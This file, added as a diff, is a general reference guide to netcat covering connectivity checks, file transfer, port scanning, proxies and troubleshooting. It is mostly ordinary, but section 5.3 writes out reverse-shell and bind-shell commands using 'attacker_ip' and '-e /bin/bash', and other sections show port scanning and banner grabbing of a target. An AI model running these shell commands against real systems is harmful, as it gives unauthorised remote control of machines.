@@ -1,0 +1,330 @@
+================================================================================
+                         NETCAT (nc) GUIDE
+                    The TCP/IP Swiss Army Knife
+================================================================================
+
+1. WHAT IS NETCAT?
+
+Netcat (nc) is a networking utility for reading from and writing to network
+connections using TCP or UDP. It can operate as a client connecting to a port
+or as a server listening on a port.
+
+Key uses:
+- Testing network connectivity
+- Transferring files
+- Port scanning
+- Creating simple servers
+- Network debugging and exploration
+
+================================================================================
+
+2. BASIC SYNTAX
+
+    nc [options] host port      Connect to host:port
+    nc -l [options] port        Listen on port
+
+================================================================================
+
+3. COMMON USE CASES
+
+3.1 TESTING PORT CONNECTIVITY
+
+Check if a port is open:
+    nc -vz google.com 443
+    
+    -v  verbose (shows connection status)
+    -z  zero I/O mode (scanning, don't send data)
+
+Timeout after 2 seconds:
+    nc -vzw 2 google.com 443
+
+Test multiple ports:
+    nc -vz google.com 80 443 8080
+
+Scan port range:
+    nc -vz google.com 1-1000
+
+3.2 SIMPLE CHAT (CLIENT/SERVER)
+
+Server (receives messages):
+    nc -l 12345
+    -l  listen mode
+    
+Client (sends messages):
+    nc localhost 12345
+
+Now both can type and send messages to each other.
+
+3.3 FILE TRANSFER
+
+Send file from server to client:
+
+Server (sending):
+    nc -l 12345 < file.txt
+
+Client (receiving):
+    nc server_ip 12345 > received.txt
+
+Send file from client to server:
+
+Server (receiving):
+    nc -l 12345 > received.txt
+
+Client (sending):
+    nc server_ip 12345 < file.txt
+
+Transfer directory (using tar):
+
+Server (receiving and extracting):
+    nc -l 12345 | tar xvz
+
+Client (sending):
+    tar cvz directory/ | nc server_ip 12345
+
+3.4 SIMPLE HTTP SERVER
+
+Serve a single file:
+    { echo -e "HTTP/1.1 200 OK\r\n"; cat index.html; } | nc -l 8080
+
+Serve with netcat-openbsd (keeps running):
+    while true; do nc -l 8080 < index.html; done
+
+3.5 PORT SCANNING
+
+Scan single port:
+    nc -vz target.com 22
+
+Scan range:
+    nc -vz target.com 1-1000
+
+Fast scan (don't resolve DNS, wait 1 second):
+    nc -vnzw 1 target.com 1-1000
+
+    -n  numeric only (no DNS resolution)
+
+3.6 BACKUP AND RESTORE
+
+Create backup over network:
+
+Server (receiving backup):
+    nc -l 12345 | gzip -d > backup.tar
+
+Client (sending):
+    tar cvf - /data | gzip -9 | nc server_ip 12345
+
+3.7 BANNER GRABBING
+n
+Get service version information:
+    echo "" | nc -v target.com 80
+
+Or:
+    nc target.com 80
+    HEAD / HTTP/1.0
+    (press Enter twice)
+
+================================================================================
+
+4. ADVANCED OPTIONS
+
+4.1 UDP MODE
+
+UDP client:
+    nc -u server_ip 53
+
+UDP server:
+    nc -lu 53
+
+4.2 TIMEOUTS
+
+Set connection timeout:
+    nc -w 5 google.com 80
+
+    -w 5  wait 5 seconds before closing
+
+4.3 PROXY AND RELAY
+
+Create a simple proxy (data goes both ways):
+    mkfifo /tmp/fifo
+    nc -l 8080 < /tmp/fifo | nc target.com 80 > /tmp/fifo
+
+4.4 EXECUTE COMMAND ON CONNECTION
+
+Execute shell when client connects (use with caution):
+    nc -l 12345 -e /bin/bash
+
+    -e  execute program after connection
+
+On BSD/Mac (which lacks -e):
+    nc -lk 12345 | /bin/bash
+
+4.5 IPV6
+
+Force IPv6:
+    nc -6 google.com 80
+
+Force IPv4:
+    nc -4 google.com 80
+
+4.6 SOURCE ADDRESS
+
+Bind to specific local address:
+    nc -s 192.168.1.100 target.com 80
+
+================================================================================
+
+5. PRACTICAL EXAMPLES
+
+5.1 DEBUGGING HTTP
+
+Manual HTTP request:
+    nc example.com 80
+    GET / HTTP/1.1
+    Host: example.com
+    Connection: close
+    (press Enter twice)
+
+Send request from file:
+    cat request.txt | nc example.com 80
+
+Debug with hex dump:
+    nc example.com 80 | xxd | less
+
+5.2 DATABASE CONNECTION TEST
+
+Test PostgreSQL:
+    nc -zv db.server.com 5432
+
+Test MySQL:
+    nc -zv db.server.com 3306
+
+Test Redis:
+    nc redis.server.com 6379
+    PING
+    +PONG
+
+5.3 REMOTE SHELL (FOR ADMINISTRATION)
+
+Reverse shell (client connects to server):
+
+Attacker (listener):
+    nc -l 4444
+
+Target:
+    nc attacker_ip 4444 -e /bin/bash
+
+Bind shell (server waits for connection):
+
+Target:
+    nc -l 4444 -e /bin/bash
+
+Attacker:
+    nc target_ip 4444
+
+5.4 WEBSOCKET TESTING
+
+Simple WebSocket upgrade test:
+    nc server.com 80
+    GET /ws HTTP/1.1
+    Host: server.com
+    Upgrade: websocket
+    Connection: Upgrade
+    Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+    Sec-WebSocket-Version: 13
+    (press Enter twice)
+
+================================================================================
+
+6. NETCAT VARIANTS
+
+Traditional netcat:
+    nc - Original Hobbit version
+    
+GNU netcat:
+    netcat - Part of GNU project
+    
+OpenBSD netcat:
+    nc - Included in most Linux distros
+    
+Ncat (from nmap):
+    ncat - Enhanced version with SSL, IPv6, proxy support
+
+    ncat -l 8080 --ssl                    # SSL server
+    ncat --proxy-type http proxy:8080     # HTTP proxy
+    ncat --broker -l 12345                # Multi-client chat
+
+================================================================================
+
+7. TROUBLESHOOTING
+
+Problem: "Connection refused"
+Cause: No service listening on that port
+Solution: Check if service is running: systemctl status service
+
+Problem: "Connection timed out"
+Cause: Firewall blocking or host unreachable
+Solution: Check firewall rules, network connectivity
+
+Problem: nc closes immediately after connection
+Cause: Using nc -l without keeping it open
+Solution: Use while loop or ncat --keep-open
+
+Problem: Data appears garbled
+Cause: Binary data interpreted as text
+Solution: Use | xxd for hex dump or redirect to file
+
+================================================================================
+
+8. SECURITY NOTES
+
+⚠️  WARNING: Never expose nc -e to untrusted networks
+⚠️  WARNING: nc traffic is unencrypted (except ncat --ssl)
+⚠️  WARNING: Port scanning may violate network policies
+
+Best practices:
+- Use SSH tunnels for sensitive data
+- Use ncat --ssl for encrypted connections
+- Firewall unused listening ports
+- Log all nc connections in production
+
+================================================================================
+
+9. QUICK REFERENCE
+
+    nc host port           Connect to port
+    nc -l port             Listen on port
+    nc -l -p port          Listen (GNU variant)
+    nc -v                  Verbose
+    nc -z                  Scan mode (no data)
+    nc -u                  UDP mode
+    nc -n                  No DNS resolution
+    nc -w sec              Timeout
+    nc -e prog             Execute program
+    nc -k                  Keep listening (OpenBSD)
+    nc -6/-4               IPv6/IPv4 only
+
+================================================================================
+
+10. REAL-WORLD ONE-LINERS
+
+Clone partition over network:
+    Server: nc -l 12345 | dd of=/dev/sdb
+    Client: dd if=/dev/sda | nc server 12345
+
+Stream video:
+    Server: nc -l 12345 | mplayer -
+    Client: cat video.mp4 | nc server 12345
+
+Network speed test:
+    Server: nc -l 12345 > /dev/null
+    Client: dd if=/dev/zero bs=1M count=100 | nc server 12345
+
+Check SSL certificate:
+    echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text
+
+================================================================================
+
+Remember: Netcat is a powerful diagnostic tool, but always consider
+security implications when opening ports or transferring data.
+
+================================================================================
+vim:ft=help:tw=80
